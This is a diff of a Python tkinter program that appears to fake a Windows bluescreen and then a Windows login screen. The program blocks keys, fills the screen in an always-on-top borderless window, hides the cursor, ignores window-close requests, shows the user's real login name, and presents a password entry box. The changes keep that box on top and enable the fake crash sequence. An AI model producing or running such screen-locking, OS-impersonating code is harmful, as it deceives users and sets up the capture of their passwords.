@@ -31,7 +31,7 @@ class KeyBlocker(threading.Thread):
         return False
 
 #Sound.mute()
-KeyBlocker()
+keyblocker = KeyBlocker()
 #time.sleep(4)
 
 screen = tkinter.Tk()
@@ -42,7 +42,7 @@ width, height = monitors[0].width, monitors[0].height
 screen.geometry(str(width)+"x"+str(height))
 screen.state("zoomed")
 screen.overrideredirect(True)
-screen.wm_attributes("-topmost", 1)
+screen.wm_attributes("-topmost", True)
 screen.config(cursor = "none")
 
 qr_code = tkinter.PhotoImage(file = "./images/qr_code.png")
@@ -64,6 +64,9 @@ font_large = Font(family = "Segoe UI Light", size = 40)
 font = Font(family = "Segoe UI Light", size = 30)
 font_small = Font(family = "Segoe UI Light", size = 14)
 font_tiny = Font(family = "Segoe UI Light", size = 10)
+
+entry_font_big = Font(family = "Calibri", size = 16)
+entry_font = Font(family = "Calibri", size = 12)
 
 x_origin, y_origin = None, None
 width_total, height_total = 0, 0
@@ -110,32 +113,66 @@ class IncreaseProgress(threading.Thread):
             if self.progress == 100:
                 time.sleep(random.randint(1, 5))
                 bluescreen.destroy()
+                black.wm_attributes("-topmost", True)
+                time.sleep(random.randint(3, 10))
+                black.wm_attributes("-topmost", False)
                 create_login()
                 break
 
 def create_login():
+
+    def entry_focus_in(_):
+        entry_window.attributes("-alpha", 1)
+        entry.config(foreground = "#999999", background = "#FEFEFE")
+        entry.icursor(0)
+
+    def entry_focus_out(_):
+        entry_window.attributes("-alpha", 0.5)
+        entry.config(foreground = "#FEFEFE", background = "#000000")
+
+    def entry_enter(_):
+        entry_frame.config(background = "#FEFEFE")
+
+    def entry_leave(_):
+        entry_frame.config(background = "#AAAAAA")
+
     screen.config(cursor = "arrow")
-    background = tkinter.Canvas(screen, bd = 0, width = width, height = height)
+    background = tkinter.Canvas(screen, border = 0, width = width, height = height)
     background.place(x = -2, y = -2)
     background.create_image(2, 2, anchor = "nw", image = background_image)
     background.create_image(width/2, height/2-170, image = profile)
+
     # C:\Users\user\AppData\Roaming\Microsoft\Windows\AccountPictures
     username = os.getlogin()
     background.create_text(width/2, height/2, fill = "white", font = font_large, text = username)
-    entry_frame = tkinter.Frame(screen, background = "#667180", bd = 3, relief = "flat")
-    entry_frame.place(x = width/2, y = height/2+90, anchor = "center")
+
+    entry_window = tkinter.Toplevel()
+    entry_window.bind("<FocusOut>", lambda _: entry_window.wm_attributes("-topmost", True))
+    entry_window.overrideredirect(True)
+    entry_window.resizable(False, False)
+    entry_window.wm_attributes("-topmost", True)
+    entry_window.attributes("-alpha", 0.5)
+    entry_window.wm_geometry("+"+str(width//2-180)+"+"+str(height//2+90))
+    entry_frame = tkinter.Frame(entry_window, border = 2, background = "#AAAAAA", relief = "flat")
+    entry_frame.pack()
+    entry_frame.bind
     password = tkinter.StringVar()
-    entry = tkinter.Entry(entry_frame, width = 30, bd = 0, fg = "#667180", relief = "flat", font = "SegoeUI", textvariable = password, show = "*", exportselection = 0)
-    entry.pack(ipady = 8)
+    entry = tkinter.Entry(entry_frame, width = 30, border = 8, foreground = "#FEFEFE", background = "#000000", relief = "flat", font = "Calibri", textvariable = password, exportselection = 0)
+    entry.pack(side = "left")
+    entry.bind("<FocusIn>", entry_focus_in)
+    entry.bind("<FocusOut>", entry_focus_out)
+    entry.bind("<Enter>", entry_enter)
+    entry.bind("<Leave>", entry_leave)
+    entry.insert(0, "Password")
+    button = tkinter.Button(entry_frame, width = 3, border = 0, foreground = "#FEFEFE", background = "#777777", relief = "flat", font = entry_font_big, text = "→")
+    button.pack(side = "right")
 
 def ignore(event = None):
     return
 screen.protocol("WM_DELETE_WINDOW", ignore)
 
-def destroy(event):
-    screen.destroy()
-screen.bind("<Escape>", destroy)
+screen.bind("<Escape>", lambda _: screen.destroy())
 
-#IncreaseProgress()
-create_login()
+IncreaseProgress()
+#create_login()
 screen.mainloop()
